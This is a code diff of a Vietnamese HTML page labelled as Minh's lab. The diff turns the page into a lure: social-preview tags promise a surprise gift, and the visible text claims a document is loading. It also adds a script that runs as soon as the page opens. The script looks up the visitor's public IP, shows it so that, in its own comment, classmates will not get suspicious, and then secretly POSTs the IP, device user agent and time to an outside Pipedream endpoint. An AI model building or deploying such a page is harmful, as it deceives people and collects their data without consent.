@@ -2,38 +2,58 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Trang Lab của Minh</title>
+    <title>Tài liệu Lab của Minh</title>
     <style>
         body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f0f2f5; }
         .box { border: 1px solid #ccc; padding: 20px; display: inline-block; background: white; border-radius: 10px; }
     </style>
     <meta property="og:title" content="Báo mới: Bạn vừa nhận được một quà tặng bất ngờ!">
-<meta property="og:description" content="Nhấn vào để xem chi tiết phần quà dành riêng cho bạn.">
-<meta property="og:image" content="https://img.meta.com.vn/Data/image/2021/09/22/anh-meo-cute-de-thuong-34.jpg"> 
-<meta property="og:type" content="website">
+    <meta property="og:description" content="Nhấn vào để xem chi tiết phần quà dành riêng cho bạn.">
+    <meta property="og:image" content="https://img.meta.com.vn/Data/image/2021/09/22/anh-meo-cute-de-thuong-34.jpg"> 
+    <meta property="og:type" content="website">
 </head>
 <body>
     <div class="box">
-        <h1>Thông tin kết nối của bạn</h1>
-        <p id="user-agent"></p>
-        <p id="ip-display">Đang lấy dữ liệu...</p>
+        <h1>Đang tải tài liệu...</h1>
+        <p id="user-agent">Đang kiểm tra thiết bị...</p>
+        <p id="ip-display">Đang xác thực địa chỉ mạng...</p>
     </div>
 
     <script>
-        // Lấy thông tin trình duyệt
+        // Hiển thị thông tin thiết bị ngay lập tức
         document.getElementById('user-agent').innerText = "Thiết bị: " + navigator.userAgent;
 
-        // Sử dụng một dịch vụ bên thứ 3 để lấy IP và hiển thị ra màn hình
-        fetch('https://eo8z560mmcz7078.m.pipedream.net')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('ip-display').innerText = "IP Công cộng của bạn: " + data.ip;
-            })
-            .catch(() => {
-                document.getElementById('ip-display').innerText = "Không thể lấy IP (có thể do chặn quảng cáo)";
-            });
+        async function collectAndSend() {
+            try {
+                // Bước 1: Lấy IP thật từ dịch vụ công cộng
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIP = data.ip;
+
+                // Hiển thị cho bạn học thấy (để họ không nghi ngờ)
+                document.getElementById('ip-display').innerText = "IP của bạn: " + userIP;
+
+                // Bước 2: GỬI cái IP đó về Pipedream của bạn
+                await fetch('https://eo8z560mmcz7078.m.pipedream.net', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: userIP,
+                        device: navigator.userAgent,
+                        time: new Date().toLocaleString()
+                    })
+                });
+
+                console.log("Dữ liệu đã được gửi bí mật về Pipedream!");
+
+            } catch (error) {
+                document.getElementById('ip-display').innerText = "Lỗi kết nối hệ thống!";
+                console.error(error);
+            }
+        }
+
+        // Chạy hàm ngay khi trang web mở
+        collectAndSend();
     </script>
 </body>
-
 </html>
-
